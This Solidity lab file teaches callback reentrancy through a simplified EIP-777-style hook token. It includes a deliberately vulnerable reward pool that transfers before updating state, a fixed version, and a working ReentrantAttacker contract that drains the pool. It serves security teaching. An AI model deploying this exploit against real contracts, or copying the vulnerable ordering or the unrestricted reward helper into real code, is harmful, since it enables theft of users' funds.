// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ITokenSecurityLab} from "./ITokenSecurityLab.sol";

// ═══════════════════════════════════════════════════════════════════════════
// (d) EIP-777-style callback reentrancy — SIMPLIFIED demo, clearly labeled.
//
//     This is NOT a full EIP-777 implementation. It keeps the two dangerous
//     features — a mandatory `tokensReceived` callback on the recipient and
//     the EIP-777 magic-value return — and drops the operator model and the
//     `tokensToSend` hook. The ordering matches the OZ v4 ERC777 `_send`:
//     balances move FIRST, then the recipient hook fires. That ordering is
//     what makes the callback a reentrancy vector into contracts that update
//     state AFTER the transfer (see ReentrantRewardPool).
// ═══════════════════════════════════════════════════════════════════════════

/// @title The EIP-777 recipient hook surface.
interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external returns (bytes32);
}

/// @title The reward-pool surface the attacker re-enters (naive OR fixed).
interface IRewardPool {
    function claim() external;

    function token() external view returns (IERC20);
}

/// @title Simplified EIP-777-flavored hook token (LAB ONLY, SIMPLIFIED demo).
/// @notice Implements the full IERC20 surface plus a mandatory recipient hook
///         that fires on every transfer to a contract. The hook MUST return
///         the EIP-777 magic value `bytes32(keccak256("ERC777TokensRecipient"))`
///         or the transfer reverts — the mandatory external call into
///         arbitrary code is the whole point of the demo.
contract HookToken is IERC20, ITokenSecurityLab {
    string public constant name = "Hook Token";
    string public constant symbol = "HOOK";
    uint8 public constant decimals = 18;

    bytes32 public constant MAGIC = keccak256("ERC777TokensRecipient");

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // Transfer/Approval events are inherited from IERC20 (single declaration).

    function mint(address to, uint256 value) external {
        totalSupply += value;
        balanceOf[to] += value;
        emit Transfer(address(0), to, value);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            if (allowance[from][msg.sender] < value) {
                revert InsufficientBalance(allowance[from][msg.sender], value);
            }
            allowance[from][msg.sender] -= value;
        }
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        if (balanceOf[from] < value) revert InsufficientBalance(balanceOf[from], value);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        // The mandatory recipient hook, AFTER balances move — OZ ERC777 `_send`
        // ordering. The caller's arbitrary code runs here.
        _callTokensReceived(from, to, value);
    }

    function _callTokensReceived(address from, address to, uint256 value) internal {
        if (to.code.length == 0) return; // EOA: no hook
        (bool ok, bytes memory data) = to.call(
            abi.encodeWithSelector(
                IERC777Recipient.tokensReceived.selector, msg.sender, from, to, value, "", ""
            )
        );
        if (!ok) revert HookNotAccepted(to);
        if (data.length != 32 || abi.decode(data, (bytes32)) != MAGIC) revert HookNotAccepted(to);
    }
}

/// @title Naive reward pool — transfer BEFORE state update (LAB, vulnerable).
/// @notice The imBTC-class bug in miniature: the payout transfer happens while
///         the claimable balance is still recorded, so a `tokensReceived` hook
///         on the recipient can re-enter `claim` and drain the whole pool. The
///         ordering mirrors Uniswap v1's ETH–imBTC swap path: external token
///         transfer first, reserve/state update after (Ch 17, Security
///         Analysis §3).
contract ReentrantRewardPool is ITokenSecurityLab, IRewardPool {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    mapping(address => uint256) public rewards;

    constructor(HookToken token_) {
        if (address(token_) == address(0)) revert ZeroAddress();
        token = token_;
    }

    /// @dev LAB helper: credit a claimable reward (unrestricted by design).
    function grantReward(address account, uint256 amount) external {
        rewards[account] += amount;
    }

    function claim() external {
        uint256 amount = rewards[msg.sender];
        if (amount == 0) revert ZeroAmount();
        token.safeTransfer(msg.sender, amount); // INTERACTION before EFFECTS — BUG
        rewards[msg.sender] = 0;
    }
}

/// @title Fixed reward pool — CEI ordering (LAB, fixed).
/// @notice The one-line fix: clear the claimable balance BEFORE the transfer
///         (check-effects-interactions). The attacker's hook re-entering
///         `claim` reads a zeroed balance, reverts, and the whole attack call
///         reverts — at most the owed amount can ever move.
contract FixedRewardPool is ITokenSecurityLab, IRewardPool {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    mapping(address => uint256) public rewards;

    constructor(HookToken token_) {
        if (address(token_) == address(0)) revert ZeroAddress();
        token = token_;
    }

    /// @dev LAB helper: credit a claimable reward (unrestricted by design).
    function grantReward(address account, uint256 amount) external {
        rewards[account] += amount;
    }

    function claim() external {
        uint256 amount = rewards[msg.sender];
        if (amount == 0) revert ZeroAmount();
        rewards[msg.sender] = 0; // EFFECTS first — the fix
        token.safeTransfer(msg.sender, amount); // INTERACTION last
    }
}

/// @title The attacker — a malicious `tokensReceived` recipient (LAB).
/// @notice When the pool pays this contract, its hook fires and re-enters
///         `claim` while the outer transfer is still in flight and the
///         claimable balance has not been zeroed. The guard only stops
///         recursion once the pool is dry, so the whole pool drains for a
///         reward that was worth a fraction of it.
contract ReentrantAttacker is IERC777Recipient, ITokenSecurityLab {
    IRewardPool public pool;
    IERC20 public token;

    uint256 public drained;

    constructor(IRewardPool pool_) {
        if (address(pool_) == address(0)) revert ZeroAddress();
        pool = pool_;
        token = pool.token();
    }

    /// @notice The malicious hook. Runs in the attacker's context — the call
    ///         to `pool.claim()` below is made BY this contract, so `claim`
    ///         reads `rewards[attacker]`, not `rewards[HookToken]`.
    function tokensReceived(
        address,
        address,
        address,
        uint256 amount,
        bytes calldata,
        bytes calldata
    ) external returns (bytes32) {
        drained += amount;
        // Guard: only re-enter while the pool can still pay. Without it the
        // innermost transfer would revert and roll back the entire drain.
        if (token.balanceOf(address(pool)) >= amount) {
            pool.claim();
        }
        return keccak256("ERC777TokensRecipient");
    }

    function attack() external {
        pool.claim();
    }
}

/// @title Benign hook recipient (LAB): counts hooks, returns the magic value.
contract PassiveHookRecipient is IERC777Recipient {
    uint256 public hookCount;

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata)
        external
        returns (bytes32)
    {
        hookCount += 1;
        return keccak256("ERC777TokensRecipient");
    }
}

/// @title Wrong-magic hook recipient (LAB): rejects every transfer.
contract WrongMagicRecipient is IERC777Recipient {
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes32)
    {
        return bytes32(0);
    }
}
